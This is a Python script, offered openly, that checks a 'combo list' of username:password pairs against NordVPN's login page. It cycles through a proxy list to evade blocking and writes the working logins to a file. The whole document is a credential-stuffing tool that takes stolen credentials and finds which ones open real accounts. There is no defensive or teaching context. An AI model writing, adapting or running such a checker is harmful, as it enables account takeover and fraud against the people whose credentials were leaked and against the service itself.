import requests
import os

# Function to check NordVPN account
def check_account(username, password, proxy):
    url = "https://nordaccount.com/login/identifier?_ga=2.80401559.163319831.1719281788-1672058283.1719281787&challenge=2%7Cc3768e43eb9441bfb9ae49bfeab5a68c"
    post_fields = {"username": username, "password": password}
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        response = requests.post(url, data=post_fields, proxies=proxies)
        if "success" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

# Load combo list and proxy file
combo_list = []
with open("combolist.txt", "r") as f:
    for line in f:
        username, password = line.strip().split(":")
        combo_list.append((username, password))

proxy_list = []
with open("proxylist.txt", "r") as f:
    for line in f:
        proxy_list.append(line.strip())

# Check accounts and delete non-functional ones
functional_accounts = []
for username, password in combo_list:
    for proxy in proxy_list:
        if check_account(username, password, proxy):
            functional_accounts.append(f"{username}:{password}")
            break

# Write functional accounts to a new file
with open("functional_accounts.txt", "w") as f:
    for account in functional_accounts:
        f.write(account + "\n")

print("Non-functional accounts deleted from the combo list.")
